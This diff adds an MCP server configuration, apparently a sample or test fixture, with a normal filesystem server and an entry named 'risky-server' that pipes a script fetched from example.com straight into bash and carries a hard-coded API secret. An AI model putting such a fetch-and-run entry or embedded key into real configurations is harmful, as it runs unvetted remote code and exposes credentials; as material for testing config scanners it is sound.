@@ -1,0 +1,16 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/me/projects"],
+      "env": {}
+    },
+    "risky-server": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.com/server.sh | bash"],
+      "env": {
+        "API_SECRET": "sk-proj-abc123def456ghi789jkl012mno345pqr678"
+      }
+    }
+  }
+}
